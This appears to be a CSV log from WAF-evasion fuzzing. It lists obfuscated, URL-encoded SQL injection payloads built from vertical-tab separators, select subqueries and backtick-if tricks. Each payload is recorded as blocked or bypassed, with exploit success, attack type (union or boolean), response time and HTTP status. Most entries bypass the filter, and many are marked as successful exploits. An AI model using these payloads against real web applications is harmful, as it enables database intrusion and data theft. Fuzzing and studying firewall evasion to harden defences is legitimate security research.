Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0'<@=1.%0bor+not+{a%0b1}=1=+(,Bypassed,No,None,Unknown,0.0177,69.53,No,500
0%27<@=1.%0bor+!~0=+(false),Bypassed,Yes,unionAtk,booleanAtk,0.0123,70.28,No,200
0%27<@!=1.+||%0b!%0b{x+(select+1)}=1=%0b,Blocked,No,None,Unknown,0.0097,70.28,No,403
0%27<@!=1+||+!+{x+(select%0b1)}=1=+,Blocked,No,None,Unknown,0.0113,70.28,No,403
0'<@=1.%0b||+!+true=%0b(not%0b,Bypassed,No,None,Unknown,0.0135,70.28,No,500
0'<@!=1+or%0b{x%0b(select+1)}=1+like%0b{x,Bypassed,No,None,Unknown,0.017,70.28,No,500
0%27<@=1+||+not%0b{a+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.01,70.28,No,200
0%27<@!=1.+||%0bnot+1=%0b(!,Bypassed,Yes,unionAtk,Unknown,0.0216,70.28,No,200
0%27<@=1.%0bor%0bnot%0b{x+(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0088,70.28,No,200
0%27<@=.1%0b||%0bnot%0b{x+(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0178,70.28,No,200
0%27<@!=1.+or%0b!%0b{x+(select+1)}=1=+,Blocked,No,None,Unknown,0.009,70.28,No,403
0%27<@=.1+or%0b!%0btrue=+(!~,Bypassed,Yes,unionAtk,booleanAtk,0.0089,70.28,No,200
0%27<@!=.1+or+!+{x%0b(select%0b1)}=1=,Bypassed,Yes,unionAtk,Unknown,0.0052,70.28,No,200
0'<@=.1%0b||+false=+(not%0b1,Bypassed,No,None,Unknown,0.0169,70.28,No,500
0'<@=1+||%0bnot%0b1=%0b(!%7e,Bypassed,No,None,Unknown,0.0144,70.28,No,500
0%27<@=1+||%0bnot%0b{x%0b(select%0b1)}=1=,Bypassed,Yes,unionAtk,Unknown,0.014,70.28,No,200
0%27<@!=.1%0bor+!%0b{x+(select+1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0216,70.28,No,200
0%27<@!=1.%0bor+!%0b{x%0b(select+1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0122,70.28,No,200
0'<@=1+||+not%0b{x+(select%0b1)}=1=%0b,Bypassed,No,None,Unknown,0.0113,70.28,No,500
0%27<@=.1%0bor%0b{a+1}=1+like%0b{a%0b1}=1,Bypassed,Yes,unionAtk,Unknown,0.0218,70.28,No,200
0%27<@!=1.%0b||+not+1=+(!+,Bypassed,Yes,unionAtk,Unknown,0.0131,70.28,No,200
0'or+@<@.+or+!%0b{x%0b(select+1)}=1,Bypassed,No,None,Unknown,0.0193,70.28,No,500
0'<@=.1+or+not+{x+(select+1)}=1=%0b,Blocked,No,None,Unknown,0.0079,70.39,No,403
0'<@!=1+||%0bnot~0=+(not%0b,Bypassed,No,None,Unknown,0.0071,70.5,No,500
0%27<@=.1%0b||+!+{`if`+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0096,70.5,No,200
0'<@=1+or%0b!%0b{`if`+1}=1=%0b(,Bypassed,No,None,Unknown,0.0109,70.5,No,500
0%27<@!=1+||+!+true=%0b(!%0b,Bypassed,Yes,unionAtk,Unknown,0.0086,70.5,No,200
0'<@=1%0b||%0b{x%0b(select+1)}=1+like+{x,Bypassed,No,None,Unknown,0.0128,70.5,No,500
0'<@=.1%0bor%0b!%0b{`if`%0b1}=1=%0b(,Bypassed,No,None,Unknown,0.0067,70.51,No,500
0%27<@=.1+or+~%0b{`if`+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0137,70.51,No,200
0'<@=.1%0b||+not+{`if`+1}=1=%0b(,Bypassed,No,None,Unknown,0.0101,70.51,No,500
0'<@=.1+or%0b!+{x%0b(select%0b1)}=1=+,Bypassed,No,None,Unknown,0.0185,70.51,No,500
0%27<@=1+||+!+{`if`+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0119,70.51,No,200
0'<@!=.1+or%0bnot%0b{`if`+1}=1=%0b(,Bypassed,No,None,Unknown,0.021,70.51,No,500
